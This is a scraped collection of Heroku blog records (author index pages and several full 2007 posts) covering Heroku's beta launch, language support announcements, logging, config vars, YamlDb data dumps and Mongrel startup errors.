Get Started... Read more Heroku for Java news August 25, 2011 Adam Wiggins We're pleased to announce the public beta of Heroku for Java. Java is the fourth official language available on the Cedar stack. Java is, by many measures , the world's most popular programming language. In addition to its large and diverse developer base, it offers a huge ecosystem of libraries and tools, an extremely well-tuned VM for fast and reliable runtime performance, and an accessible C-like syntax. But there are also many criticisms commonly leveled against the language. We'll take a closer look at Java's strengths and weaknesses in a moment, but first: Heroku for Java in 2 minutes Create a project with three files: pom.xml <?xml version=\"1.0\"... Read more Polyglot Platform news August 03, 2011 Adam Wiggins Programming languages are silos. The libraries, development tools, deployment practices, and even naming schemes associated with one language — say, Ruby — rarely have much carry-over to another language — say, Python, Erlang, Java, or C++. Professional programmers dedicate their careers to becoming experts in a particular language, making extensive personal investment in learning not only their chosen language's syntax and libraries, but also the ecosystem of tools and practices from that language's community. Similarly, companies build up codebases, deployment infrastructure, policies, and tacit knowledge in their engineering staff around a single language. Deep investment in a... Read more Clojure on Heroku news July 05, 2011 Adam Wiggins We're very excited to announce official support for Clojure , going into public beta as of today. Clojure is the third official language supported by Heroku, and is available on the Cedar stack. Clojure is a Lisp -like functional programming language which runs on the Java Virtual Machine (JVM) . It offers powerful concurrency primitives based on immutable data structures, with emphasis on composability and correctness. The Clojure community is vibrant and growing quickly. More about Clojure in a moment, but first: Clojure on Heroku in 2 minutes Create a project with three files: project.clj (defproject hello-world \"0.0.1\" :dependencies [[org.clojure/clojure... Read more The New Heroku (Part 4 of 4): Erosion-resistance & Explicit Contracts news June 28, 2011 Adam Wiggins In 2006, I wrote Catapult : a Quicksilver -inspired command-line for the web. I deployed it to a VPS (Slicehost), then gave the URL out to a few friends. At some point I stopped using it, but some of my friends remained heavy users. Two years later, I got an email: the site was down. Logging into the server with ssh , I discovered many small bits of breakage: The app's Mongrel process had crashed and not restarted. Disk usage was at 100%, due to growth of logfiles and temporary session data. The kernel, ssh, OpenSSL, and Apache needed critical security updates. The Linux distro had just reached end-of-life , so the security fixes were not available via apt-get . I tried to migrate to a... Read more The New Heroku (Part 3 of 4): Visibility & Introspection news June 24, 2011 Adam Wiggins Visibility and introspection capabilities are critical for managing and debugging real-world applications. But cloud platforms are often lacking when it comes to visibility. The magical black box is great when it \"just works,\" but not so great when your app breaks and you can't look inside the box. Standard introspection tools used in server-based deployments — such as ssh , ps aux , top , tail -f logfile , iostat — aren't valid in a multi-tenant cloud environment. We need new tools, new approaches. Heroku's new runtime stack, Celadon Cedar , includes three powerful tools for visibility and introspection: heroku ps , heroku logs , and heroku releases . This post will examine... Read more The New Heroku (Part 2 of 4): Node.js & New HTTP Capabilities news June 22, 2011 Adam Wiggins Node.js has gotten its share of press in the past year, achieving a level of attention some might call hype. Among its touted benefits are performance , high concurrency via a single-threaded event loop , and a parity between client-side and sever-side programming languages which offers the Promethean opportunity of making server-side programming accessible to front-end developers. But what is Node.js, exactly? It's not a programming language - it's simply Javascript. It's not a VM: it uses the V8 Javascript engine , the same one used by the Chrome web browser . Nor is it simply a set of libraries for Javascript . Nor is it a web framework, though the way it is sweeping the... Read more The New Heroku (Part 1 of 4): The Process Model & Procfile news June 20, 2011 Adam Wiggins In the beginning was the command line. The command line is a direct and immediate channel for communicating with and controlling a computer. GUIs and menus are like pointing and gesturing to communicate; whereas the command line is akin to having a written conversation, with all the nuance and expressiveness of language. This is not lost on developers, for whom the command prompt and blinking cursor represents the potential to run anything, to do anything. Developers use the command line for everything from starting a new project ( rails new ) to managing revisions ( git commit ) to launching secondary, more specialized command lines ( psql , mysql , irb , node ). With Celadon Cedar , Heroku's... Read more Ruby 1.9.2 Is Now The Default news June 08, 2011 Adam Wiggins Ruby 1.9.2 on Bamboo is now the default for new apps created on Heroku. As we said back in April : Ruby 1.9.2 as the new gold standard for production Ruby apps. In 2011, we’ve seen more and more developers move to 1.9.2. It’s fast, stable, and sees excellent support throughout the community. You can always list available stacks with the heroku stack command; and if you want your new app on Ruby 1.8.7 you can run heroku create --stack bamboo-ree-1.8.7 to explicitly ask for the older stack. Read more New Logging Now in General Availability news February 03, 2011 Adam Wiggins In December, we rolled out the public beta of a sweet new logging system for Heroku . The new system combines log output from your app’s processes and Heroku’s system components (such as the HTTP router). With all of your logs collated into a single, time-ordered stream, you get an integrated view of everything happening in your app. Here’s a sample: $ heroku logs 2010-10-21T14:11:16-07:00 app[web.2]: Processing PostController#list (for 208.16.84.131 at 2010-10-21 14:11:16) [GET] 2010-10-21T14:11:16-07:00 app[web.2]: Rendering template within layouts/application 2010-10-21T14:11:16-07:00 app[web.2]: Rendering post/list 2010-10-21T14:11:16-07:00 app[web.2]: Rendered includes/_header... Read more Improved Maintenance Mode for All Apps news January 06, 2011 Adam Wiggins The improved maintenance mode we described last month is now standard for all existing and new apps. This new maintenance mode is faster and much more scalable, particularly for apps with more than fifty dynos. It handles maintenance mode at the HTTP router, providing an instantaneous response for turning maintenance mode on or off regardless of the size of your app. It uses a standard page which serves with an HTTP 503 code. You can use the Custom Error Pages add-on to provide your own maintenance page to the router. (If you preferred the old maintenance mode, you can manually add it to your app by installing this middleware and setting a MAINTENANCE config var.) Read the docs for usage... Read more A New Approach to Errors news December 21, 2010 Adam Wiggins When your app is crashed, out of resources, or misbehaving in some other way, Heroku serves error pages to describe the problem. We also have a single page for platform errors, once known as the ouchie guy (pictured right). While the approach of showing error information directly via the web has worked well enough, there was room for improvement on both developer visibility and professionalism of presentation to end users. With that in mind, we’ve reworked our approach on error handling, making improvements that should make it much easier for you, the developer, to diagnose and correct errors in your app. This new approach can be broken down into four features: Consolidated error... Read more Heroku Gets Sweet Logging news December 13, 2010 Adam Wiggins Access to application logs on Heroku has historically been one of the least usable functions of the platform. The “heroku logs” command was nothing more than a broadcast fetch of the logfiles for every web and worker dyno in your app. This worked ok for small apps, but the user experience became very poor once you got past five or ten dynos. I’m incredibly excited to announce that today we’re rolling out the public beta of our new logging add-on . This is a whole new way of capturing and collating logs, based on a syslog routing layer we’ve dubbed Logplex . Logplex routes syslog traffic the same way that our HTTP routing mesh routes HTTP traffic. Not... Read more Release Management on Heroku news November 17, 2010 Adam Wiggins When a team of developers uses continuous deployment to deploy to their Heroku staging and production apps multiple times per day, having a record of what was deployed and when can be very valuable. This is especially true when bad code gets deployed: being able to recover quickly from failure is a key part of any agile process. Today, Heroku is announcing our release management add-on . When installed on an app, every code deploy is recorded in a ledger with information about who deployed, when, and what commit hash. And it’s not just code: anything that changes the app environment, such as adding or removing add-ons or changing config vars, creates an entry in the release ledger.... Read more NoSQL, Heroku, and You news July 19, 2010 Adam Wiggins Why NoSQL Matters “NoSQL” is a label which encompasses a wave of innovation now happening in the database space. The NoSQL movement has sparked a whirlwind of discussion, debate, and excitement in the technical community. Why is NoSQL generating so much buzz? What does it mean for you, the application developer? And what place does NoSQL have for apps running on the Heroku platform? SQL (the language) and SQL RDBMS implementations (MySQL, PostgreSQL, Oracle, etc) have been the one-size-fits-all solution for data persistence and retrieval for decades. The rise of the web and the LAMP stack cemented the role of the relational database. But in 2010 we see a variety of application... Read more Background Jobs with DJ on Heroku news July 15, 2009 Adam Wiggins Our goal for the Heroku platform has been to create a totally smooth and seamless experience for getting your Ruby web application online. Web apps revolve around one or more dynamic web processes: what Rubyists often call a mongrel, and what we call a dyno . When it comes to dynos, we think we’ve really nailed it, and nothing makes that more tangible than the ease of scaling your app with the dyno slider . But most serious web apps have a second aspect: one that gets less attention, but one that is often just as important as the web process. Like the dark side of the moon, this second half of your application is not directly visible to users, but without it the app would not be... Read more Pimp Your Cart: Shopify Apps on Heroku news June 11, 2009 Adam Wiggins Our good friends at Shopify recently released a developer platform which makes it crazy easy to build custom functionality into an e-commerce store using a standalone Rails app. There are already some great apps available in their app store , many of which are running on Heroku. (The shopify.com homepage also now lives here .) Check out the excellent getting started video by James MacAulay. It shows just how slick the Shopify API is – these guys are really taking e-commerce to the next level. (And bonus points for use of config vars to store API keys!) Read more Config Vars for Deploy-Specific Settings news April 07, 2009 Adam Wiggins Say you’re working on a Rails app, and you want to publish your code on Github. Most apps have some deploy-specific private config values – for example, if you’re using the S3 storage back-end for Paperclip , and your S3 keys are saved in config/amazon_keys.yml. You certainly don’t want to push those up to Github – what to do? You could maintain a separate deploy branch, and commit your deploy config only to that. You can then work on the main branch, and rebase the deploy branch whenever you go for a deploy. That’s a bit of extra work you could do without, though – and you know sooner or later, you’re going to accidentally push the wrong... Read more Fork Our Docs news April 01, 2009 Adam Wiggins Heroku is now sporting an updated docs layout at docs.heroku.com . These new docs should be much easier to navigate and link to. We built this as a standalone Sinatra app serving Markdown files, partially inspired by Assaf Arkin’s approach to Buildr . It uses Cache-Control with a long max-age, to take advantage of the Varnish http cache which fronts all Heroku apps . This makes it as snappy as staticly rendered pages, while retaining the flexibility of a dynamic app on the backend. The docs app is deployed as a regular app on Heroku (just like this blog ). Nothing special-case here: we deploy with git push, just like any other Heroku user. Dogfooding is good for you. The app’s... Read more Deploy Merb, Sinatra, or any Rack App to Heroku news March 05, 2009 Adam Wiggins The past eighteen months have seen an explosion of Rails-inspired Ruby web frameworks . Merb and Sinatra are the best known; plus many others such as Ramaze , Camping , and Waves . That’s why we’re so pleased to announce the ability to deploy any Rack-compatible web app to Heroku. Assuming you have a Heroku account , here’s how you can deploy a Sinatra app in about 30 seconds. Make a new directory, and inside create hello.rb: require 'rubygems' require 'sinatra' get '/' do \"Hello from Sinatra on Heroku!\" end Then create a config.ru file in the same directory (the location follows the Passenger convention ): require './hello' run Sinatra::Application Now let’s put our... Read more The Future of Deployment news February 05, 2009 Adam Wiggins Application deployment is changing. In relatively short order I’ve gone from buying hardware, to monthly hosting, to metered CPU time, and from building my open-source software manually, to package managers, to fancy config tools and recipes to pre-build whole machine images. What’s next? The Old Way I can deploy Rails apps in a traditional hosting environment pretty quickly. For a small app, I might make a new unix user and database on a personal Slicehost slice and do a quick code checkout. After setting up a few permissions and twiddling my Nginx config, in a matter of fifteen minutes or so my app is online. Not bad at all. For a bigger app, it takes more time. In days of... Read more Rails 2.2 on Heroku news November 26, 2008 Adam Wiggins The gem for Rails 2.2 is now installed and ready for use on Heroku. To use, change your environment.rb to read: RAILS_GEM_VERSION = '2.2.2' Then run rake rails:update, and commit the changed files. Check out the Ruby Inside article for more details on what’s new. Read more How-To: Heroku + Hoptoad news September 17, 2008 Adam Wiggins Hoptoad is a great service by Thoughtbot for collecting exceptions. Like exception_notifier, but without clogging your inbox, and much prettier. Using Hoptoad with Heroku is a cinch. First, sign up for a free Hoptoad account . Now install their notifier plugin. If you’re working locally and deploying to Heroku with Git, install with script/plugin: script/plugin install git://github.com/thoughtbot/hoptoad_notifier.git Or if you’re using the Heroku web editor, open the vendor folder and click Gems & Plugins, then enter the plugin URL in the “Install from URL ” box at the bottom. Next, create a new file config/initializers/hoptoad.rb containing: ... Read more Heroku API Update news September 03, 2008 Adam Wiggins The Heroku API gets a major update today; you can now view and manage all of your application’s settings straight from the command line. New in this version: Manage sharing (add/remove/list collaborators) Manage multiple ssh keys for your user (add/remove/list keys) Update settings (public true/false, mode production/development) Rename an app Run rake tasks remotely A taste of the new command-line goodness: adam@kvasir:~$ heroku create gagetron Created http://gagetron.heroku.com/ | git@heroku.com:gagetron.git adam@kvasir:~$ heroku info gagetron === gagetron Web URL: http://gagetron.heroku.com/ Git Repo: git@heroku.com:gagetron.git Mode: development Public: false Collaborators:... Read more API and External Git Access news March 03, 2008 Adam Wiggins Heroku now has an API (accessible from the command line, a Ruby library, or REST calls), revision control on all apps with Git, and remote access to the Git repository. The combination of these new features means that you can now work on your apps using the local tools you love – like TextMate, vi, or emacs – and still get the benefit of zero-configuration deployment to Heroku. How does it work? Grab the Heroku gem with “gem install heroku”. A sample work session looks like this: heroku clone myapp cd myapp ruby script/server …edit locally… git add . git commit -m “local changes” git push The final step will deploy the app to Heroku,... Read more Heroku Mailing List news February 11, 2008 Adam Wiggins Heroku now has a mailing list on Google Groups. Stop by and introduce yourself, but first read the welcome post . Read more We're Huge in Japan news February 05, 2008 Adam Wiggins Last night we noticed a flood of .jp email addresses appearing on the waiting list – several hundred over the course of just a few hours. Turns out someone posted a comprehensive and flattering review of Heroku in Japanese (translation) . I just couldn’t resist using the opportunity to post this image: Actually, it’s not just Japan: the international response to Heroku has astonished us. Denmark , New Zealand, France , Russia , Brazil – over half of our users are from outside the US. We chalk this up more to the universal appeal of Ruby and Rails than anything we’ve done, but either way it’s pretty cool. By the way, we know news on the Heroku front... Read more Easy Authentication news January 14, 2008 Adam Wiggins Backstory: A Fiery Debate Writing a user model and the standard login authentication code seems like busywork to a lot of coders. In fact, many people expected a next-generation app framework such as Rails to handle this for you. After all, Django does . Initially the login engine for Rails seemed to fill this slot, but following a fair amount of controversy over best practices, the login engine was killed by its creator. With our BDfL having forever cursed prebuilt login systems , the Rails community mostly stopped trying to make them. Yet, this puts us back at square one: developers are annoyed at the amount of boilerplate busywork that is necessary for almost every web app they write. ... Read more Rails Hosting: Easy as Pie news January 12, 2008 Adam Wiggins Yesterday, DHH said : “I’d love for Rails to be easy as pie to run in a shared hosting environment, though. I’d love for Rails to be easy as pie to run in any environment. In that ‘more people could have fun learning Rails and deploying their first hobby application’ kind of way.” We humbly suggest that Heroku is one possible solution to the latter part of statement. Our vision for the long term is much grander than just a learning/hobby tool; but our beta product, as it stands today, can already fill this need quite nicely. Read more Heroku Loves RSpec news January 03, 2008 Adam Wiggins RSpec 1.1 is now a part of the default plugin kit for Heroku apps. We’ve been fans of RSpec for a while now, and feel that it represents the future of TDD / BDD for the Rails world. If you’re not familiar with RSpec, read up and then give it a try. You don’t need to install anything to use RSpec in your Heroku app, but you do need to initialize the spec/ and stories/ directories by running the rspec generator. Just open the Generate dialog, type in rspec , and click Run. Once you’ve written some specs, you can run them the usual way: open a rake console and type spec . You can still run your Test::Unit tests with the test command, or you can run tests followed by... Read more Goodbye Rails 1.2 news January 02, 2008 Adam Wiggins Rails 1.2 is now officially deprecated for Heroku apps. Starting January 3 (that’s tomorrow), new features we are developing will not be available on apps still configured to use Rails 1.2. Then, on January 21, we will automatically upgrade any remaining 1.2 apps. We know it’s only been a month since Rails 2 came out, so we hope this doesn’t come across as overly harsh. By taking this approach we can spend less time backporting, which means more time for new features. Since Heroku is still in early beta we feel that this is reasonable. Rest assured that when the next major Rails release comes around, we’ll be committed to supporting 2.0 for a much longer time... Read more View-Only Users news January 02, 2008 Adam Wiggins There are now two access levels for collaborators on Heroku apps: Full edit access , which allows access to everything: editing code, importing or exporting the database, changing the settings, etc. View-only access , which allows the user to view the app only. That is, they can visit the app url (myapp.heroku.com) but not any of the settings pages or the edit url (edit.myapp.heroku.com). For example, a client who wants to use the app but neither needs nor wants access to the code could be set as a view-only user. If your app sharing is set to public, the view-only access level has no use. Do note that these settings have no effect on users changing your app’s data through the... Read more Gems & Plugins Manager news December 22, 2007 Adam Wiggins Behold: the Heroku gems/plugins manager. This has been one of our most requested features to date, and we’re glad to finally get this released. Although you could manually upload plugins previously, this will make the process a lot smoother. (You can still manually manipulate the files in your vendor directory if you prefer.) To get to the manager, open your vendor directory in the lefthand filenav, and click the link that appears at the top: You can search by name, or browse the list of 2500+ gems and 1000+ plugins. Once you find what you’re looking for, click on Install in the righthand column to install it into your app. Click Remove to remove it if it’s no longer... Read more Rails 2 news December 17, 2007 Adam Wiggins Rails 2 is now the default for all newly created Heroku apps. Existing apps will continue to run on 1.2 unless you edit config/environment.rb and change the version number manually. Importing an app will try to guess the Rails version from your environment.rb, but you should double-check after the import to make sure the version is set to what you wanted. We’ll leave a 1.2 gem available for a while, but we’re going to take advantage of our beta status here and keep the time window on this relatively short – perhaps a month or two. (Don’t worry, by the time the next major Rails release goes around, we’ll have a plan for longer-term support of legacy versions... Read more It's the Little Things news December 12, 2007 Adam Wiggins Sometimes, it’s the little things. A few niceties deployed recently: The code editor UI now has a liquid layout. If you’re a life hacking / GTD type like me, you’ll especially enjoy this in combination with Firefox’s fullscreen mode. (FF for OS X doesn’t have fullscreen, unfortunately; try this instead.) Download files from the context menu. You can use this in conjunction with upload to edit in your local editor, load an image into your photopaint program, etc. Speaking of images, if you click on an image, it will display it in the editor pane. There’s a link to update your account password on the My Apps page. (Shocked this wasn’t there before?... Read more Handling a Failed Mongrel Start news December 02, 2007 Adam Wiggins We’ve been working our tails off over the past few weeks to process all the feedback you guys have been sending (or that we’ve gleaned from the system logs). I think that this photo of the trashcan under Orion’s desk tells the story pretty well: He bought that case of Rockstar at Costco last week, and consumed it all as part of our mad dash to squash bugs exposed by our sudden surge of users. Bad for Orion’s health, but good for Heroku’s backend stability. :) One major area we’ve been dealing with in this past week is the issue of failed mongrel starts. That is, exceptions that occur while the Rails framework is booting, rather than on a page request.... Read more YamlDb for Database-Independent Data Dumps news November 23, 2007 Adam Wiggins One of the many benefits of Rails is database independence. Migrations are particularly nice in this regard; and the easy-to-read / Rubyified display of your schema (via rake db:schema:dump) in schema.rb is icing on the cake. But what about data? For import and export of the actual data, we’re stuck with mysqldump (or pg_dump, if you’re so inclined). Further, these dump formats are not terribly readable, contain lots of information you may or may not want to copy (like permissions, schema settings, views, triggers…you know, database features that Rails users are supposed to avoid). Worst of all, ddata dumps are vendor specific, so you can’t move data between... Read more The Big Kickoff news October 30, 2007 Adam Wiggins Unless you’re a big company with lots of marketing dollars, rarely does a product launch start with a bang. It’s a gradual process – first you show a few close friends and family members, then some coworkers from your previous job, then some friends of friends. The word starts to spread as you and your partners furiously hack away, trying to make the product stable enough to stand up to a pummeling from the general public. So there’s no big kickoff; just a quiet emergence. And if your product offers something of real value, awareness in your target market will grow steadily and strongly over time. So it is with Heroku. James, Orion, and I have spent the last... Read more", "date": "2013-04-03,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "Abe Pursell", "Abe Pursell", "Abe Pursell"], "link": "https://blog.heroku.com/authors/abe-pursell", "abstract": "Batkid Saves the Day in SF news December 04, 2013 Abe Pursell Editor's Note : This is a guest post from Jonathan Cipriano , creative developer based in San Francisco currently working as a Creative Research & Development Manager at AKQA. A few weeks back, the Make-a-Wish Foundation made a 5-year old cancer survivor named Miles dream come true by helping him play out a Batman-style adventure in San Francisco . The city was morphed into Gotham for a day with the help of 12,000 volunteers. A rescue mission turned the pint-sized crusader into a social media sensation. Miles became Batkid for a day. Inspired by his story, some creative devs at AKQA thought it would be fitting to memorialize the heroic event with an interactive comic book, ... Read more Video and Slides: Optimizing Production Apps on Heroku news August 01, 2013 Abe Pursell On July 31st, our customer advocate team presented the second webcast in a two-part series on production apps on Heroku. In case you missed it, the recording and slides are below. This second session is designed for an audience familiar with Heroku basics and covers: Using a CDN to increase app performance How to manage the asset pipeline Using heroku-pg-extras to gain visibility into database performance How to manage database migrations How to use a database follower for transactional and analytics database reads How to set up caching with Heroku add-ons Useful labs features Optimizing production apps on heroku 7.31.13 from Heroku Resources from the presentation: S3 Best... Read more Video and Slides: Running Production Apps on Heroku news July 11, 2013 Abe Pursell On June 27th, our customer advocate team presented the first webcast in a two-part series on running production apps on Heroku. In case you missed it, the recording and slides are below. This first session is designed for an audience familiar with Heroku basics and covers: Production app setup and expectations App production checklist Using Unicorn to increase app performance Using 2X dynos to increase app performance How to configure timeouts to ensure app stability Using log-runtime-metrics for added visibility Running Production Apps on Heroku 6.27.13 from Abe Pursell Resources from the presentation: Log2viz Log-runtime-metrics Getting Started with Unicorn Follower... Read more", "date": "2013-12-04,"},
{"website": "Heroku", "title": null, "author": ["Email", "Abe Dearmer"], "link": "https://blog.heroku.com/authors/abe-deamer", "abstract": "An Iconic Fundraising Tradition Returns with a 21st Century Twist life January 21, 2021 Abe Dearmer The Xplenty platform allows organizations to integrate, process, and prepare data for analytics in the cloud. Xplenty is also available as a Heroku Add-on . Abe Dearmer is the company's COO. Often, innovation sparks innovation in unforeseen ways. In the early 1950’s, television brought the world an entirely new experience that not only changed people’s daily lives, but also created a unique platform for national culture. One of the most beloved and enduring traditions that emerged on this new national stage was the telethon. A combination of “television” and “marathon,” a telethon is a broadcast fundraising event that lasts for several hours or days and features entertainment... Read more", "date": "2021-01-21,"},
{"website": "Heroku", "title": "The Big Kickoff", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/the_big_kickoff", "abstract": "The Big Kickoff Posted by Adam Wiggins October 30, 2007 Listen to this article Unless you’re a big company with lots of marketing dollars, rarely does a product launch start with a bang.  It’s a gradual process – first you show a few close friends and family members, then some coworkers from your previous job, then some friends of friends.  The word starts to spread as you and your partners furiously hack away, trying to make the product stable enough to stand up to a pummeling from the general public.  So there’s no big kickoff; just a quiet emergence.  And if your product offers something of real value, awareness in your target market will grow steadily and strongly over time. So it is with Heroku. James, Orion, and I have spent the last several months developing what we think fills an important niche in the Rails world: a hosted development environment that is dead-simple to get started with.  How many people have gotten excited about learning Rails, only to be stymied by the complexity of installing local development tools – before they even get the chance to write a “Hello, World” program?  Or how often have you thrown together a small app for personal use, something that would be really useful to a few friends – but it’s too much bother to deploy it onto a public-facing webserver?  These are some of the problems that Heroku will be able to solve in the very near future.  (We have grander plans for the long term, but we’ll save that discussion for another day.) This blog will serve as a changelog for our product.  As we deploy new features and other changes we’ll post here.  Incidentally, this is as much to coordinate between ourselves as it is to communicate with our users. If you don’t have an account on Heroku yet (as of this writing, only a handful of people do), sign up on our waiting list .  We hope to be able to start slowly sending out invitations within the next week or two. news", "date": "2007-10-30,"},
{"website": "Heroku", "title": "1,000+ Signups: The Floodgates are Open", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/1000_signups_the_floodgates_are", "abstract": "1,000+ Signups: The Floodgates are Open Posted by James Lindenbaum November 16, 2007 Listen to this article A couple of weeks ago we quietly started accepting signups for our private beta.  We knew people would be excited about Heroku; I mean, we’re pretty excited about it.  Word seems to have gotten out, as over the last several days well over 1,000 people have signed up. We are inviting users off the waiting list all day, every day, as fast as we can.  So we’re also receiving a constant stream now of feedback email.  Some quotes: OH – MY – GOD , Heroku!  It’s absolutely great.  In my opinion, it’s really a revolution in Rails development.  – Chris Wow. This is impressive, I like what I see.  – Ben This is exactly what I was looking for right now. I’ve started teaching myself ruby on rails, and it’ll be fantastic to be able to have something online to mess around with.  – Micah I am really excited about this project.  It may become my de facto rails development environment.  – Tony Boy this looks awesome!  When you see it, you go… “Well, of course!  Why didn’t I think of that?”  – Dirk Wow what an awesome idea.  – Bill There have been some nice blog posts too, including Peter Cooper’s Ruby Inside . We are glad to hear so many of you are so excited.  Thanks to all of our users for your enthusiasm and feedback.  We can’t wait to see how you feel about all the features we have planned… news", "date": "2007-11-16,"},
{"website": "Heroku", "title": "Some Q & A", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/some_q_a", "abstract": "Some Q & A Posted by James Lindenbaum November 17, 2007 Listen to this article How long before I get in? We are sending out tons of invites every day.  We’d prefer not to have a waiting list, but doing it this way allows us to let people in only as we’re sure our infrastructure can handle the load.  The number of people we let in each day keeps increasing, as our existing users give us feedback (thanks guys!) which helps us improve our product for the next batch of people coming in. One of the areas we are most interested in is collaboration – this is, after all, a web application.  We want to encourage existing users to invite their friends to become users and start collaborating with them, so we have given existing users the ability invite friends directly. So if you want to get an account faster, ask a friend for an invite. If you are on the waiting list, we haven’t forgotten about you.  We will get to you soon, and we really appreciate your patience. I found a bug, what do I do? What kind of feedback do you want? Whether you actively found a bug, something just doesn’t seem to work or doesn’t work as expected, you can’t do something you want to do, or you have feature requests, please please please tell us ! The whole purpose of this limited beta is to get your feedback and use it to make Heroku awesome and rock solid. What about my existing tools and editor? Do you support subversion? Can you make your editor better? We are hardcore vi, TextMate, and subversion fans.  We will not consider Heroku completely usable until editing and version control either works as well as those tools, or there is a way to continue to use those tools with our service. The existing Heroku editor absolutely works for making Rails applications.  We know because we use it.  So we also know that it kind of blows, as real developer editors go (so far we do think we’ve beat Notepad, though perhaps just slightly).  It is getting better all the time, and we have some specific reasons we want to make a browser-based editor, which we’ll talk about in another post soon. In the meantime, there are a couple of things you can do: Import & Export If you want to edit locally and deploy to Heroku, you can make liberal use of the import and export features.  Setup your whole app locally, then just import it into Heroku.  Your archive will replace the existing code base.  If you make changes on Heroku and want to continue working locally, just export the app. Snapshots Snapshots allow you to take a named snapshot of your app’s code and data at any point.  You can take as many snapshots as you want for version control purposes.  Take a backup snapshot before you import, or take a snapshot before you try some crazy edits. Can I import my huge complicated app? What about MySQL versus PostgreSQL? Yes, you can import your huge complicated app.  It may or may not work.  If it doesn’t work, please tell us about it.  Also, there is currently a 10MB limit for the storage footprint of each app.  If your uploaded app is larger, you will see an overlimit message. We are using PostgreSQL internally for several really important reasons, but we do plan to fully support MySQL database dumps, both in and out.  We are almost done with this feature, so look for it soon. news", "date": "2007-11-17,"},
{"website": "Heroku", "title": "Some More Q & A", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/some_more_q_a", "abstract": "Some More Q & A Posted by James Lindenbaum November 20, 2007 Listen to this article What about gems, plugins, and different Rails versions? We are definitely going to support gems and plugins.  We are almost finished with a slick gem and plugin installer you can use for each app.  In the meantime, you can install plugins by importing or uploading the files directly into vendor/plugins. Currently, we only support the latest stable version of Rails.  You can use a different version by uploading a frozen vendor/rails, but this may not work because of the 10MB storage limit constraint (rake rails:freeze:edge won’t work, by the way, because there are no outgoing network connections yet – we’ll discuss this in more detail in another post).  We hope to be expanding our features in this area shortly. Are my application and data secure? I can execute arbitrary shell commands! This is a brand new, limited beta, so we are not making any promises about security.  That being said, we have worked hard to provide a secure environment, and we believe your application and data are completely secure. Because we are providing a platform for executing ruby code, you have full access to system commands.  While you don’t have an actual shell, you do have the ability to run shell commands via ruby.  This is a feature, not a bug.  We don’t believe you should need to run shell commands for any purpose, but giving our users a full ruby environment is important to us.  Being able to run arbitrary shell commands is not a security threat the way the system is architected. Can I have multiple environments, staging and production? Can I run an app with the environment set to production? Yes, we plan to offer multiple instances of your app and allow you to set the environment type for each.  For now, however, each application has only one instance, and is always in development mode. What about testing? Testing is very very important to us and we plan to fully support it (we haven’t yet decided if this will be the standard Test::Unit or RSpec – email us if you have thoughts on the topic).  We have several great tools and features planned for testing.  For now, however, a testing database is not provided, so tests can’t be run.  This is coming soon. Hosting, performance, paid accounts? We plan to offer multiple paid account types, with varying levels of features and performance.  We will also always offer a free account.  For right now, we are only offering one-size-fits-all free accounts. news", "date": "2007-11-20,"},
{"website": "Heroku", "title": "YamlDb for Database-Independent Data Dumps", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/yamldb_for_databaseindependent_data_dumps", "abstract": "YamlDb for Database-Independent Data Dumps Posted by Adam Wiggins November 23, 2007 Listen to this article One of the many benefits of Rails is database independence.  Migrations are particularly nice in this regard; and the easy-to-read / Rubyified display of your schema (via rake db:schema:dump) in schema.rb is icing on the cake. But what about data?  For import and export of the actual data, we’re stuck with mysqldump (or pg_dump, if you’re so inclined).  Further, these dump formats are not terribly readable, contain lots of information you may or may not want to copy (like permissions, schema settings, views, triggers…you know, database features that Rails users are supposed to avoid). Worst of all, ddata dumps are vendor specific, so you can’t move data between databases (e.g., SQLite, MySQL, PostgreSQL).  Rails is database-independent, but you’re pretty much stuck with whatever you picked at the start of the project.  That’s hardly agile. Realizing this problem was going to affect us in a pretty direct way with the import/export features of Heroku, Orion and I threw together a plugin yesterday which we’ve given the (rather uninspired) name YamlDb.  Once you’ve installed it: script/plugin install git://github.com/adamwiggins/yaml_db.git (use http://github.com/adamwiggins/yaml_db.git for Rails < 2.1) …you’ll have the additional rake tasks db:data:dump and db:data:load, which access a file data.yml.  This is a simple dump of your database’s tables, which along with schema.rb, describe everything you need to make a complete copy of your database.  (db:dump and db:load are shortcuts to do both schema and data together.) What’s awesome about this is that you can switch databases in the blink of an eye.  Got a SQLite3 database that’s gotten too big for its britches?  rake db:dump, create a MySQL database, update your config/database.yml, and rake db:load.  Presto, your app is now running in MySQL.  Want to give PostgreSQL a try?  Same process.  Run it for a week, and decided you miss mysqladmin too much?  Reverse the process, bringing the data which was stored in Postgres during that week back into MySQL. Caveats: it’s much slower than dumping and restoring with your database’s native tool, and probably will stop working altogether with a database that is larger than RAM .  But for most apps it should work fine.  In the future we will most likely write database-specific extensions to make dump/restore process happen in chunks, and thus be more scalable. As for Heroku, it now uses yaml_db as its native import/export format.  So when you export an app from Heroku, you’ll always see a db/data.yml with your current data.  It also makes it easy to import data into your Heroku app, at the same time you’re importing the code, or later on.  Just install yaml_db in your app locally and run db:dump.  Include data.yml with the import (or run and upload it separately), and then run db:load at the rake console. rails opensource newfeatures", "date": "2007-11-23,"},
{"website": "Heroku", "title": "Handling a Failed Mongrel Start", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/handling_a_failed_mongrel_start", "abstract": "Handling a Failed Mongrel Start Posted by Adam Wiggins December 02, 2007 Listen to this article We’ve been working our tails off over the past few weeks to process all the feedback you guys have been sending (or that we’ve gleaned from the system logs).  I think that this photo of the trashcan under Orion’s desk tells the story pretty well: He bought that case of Rockstar at Costco last week, and consumed it all as part of our mad dash to squash bugs exposed by our sudden surge of users.  Bad for Orion’s health, but good for Heroku’s backend stability. :) One major area we’ve been dealing with in this past week is the issue of failed mongrel starts.  That is, exceptions that occur while the Rails framework is booting, rather than on a page request.  These sorts of exceptions often happen with imported apps, because certain types of plugins or gem dependencies may not work out of the box with Heroku yet, or you might just have some odd stuff in your environment.rb that isn’t compatible with the version of Rails we’re running. Up until recently, this was producing an unhelpful HTTP 502 bad gateway page.  Now, you’ll see the contents of your mongrel.log so that you can diagnose the issue. If you were paying close attention, you might have noticed a “Restart” button that existed for a few days.  We’ve removed that in favor of automatically restarting whenever you save a file that needs a restart (like routes.rb or environment.rb).  So far this seems to work pretty well – but as always, let us know if you find a case where it doesn’t work as expected. news newfeatures", "date": "2007-12-02,"},
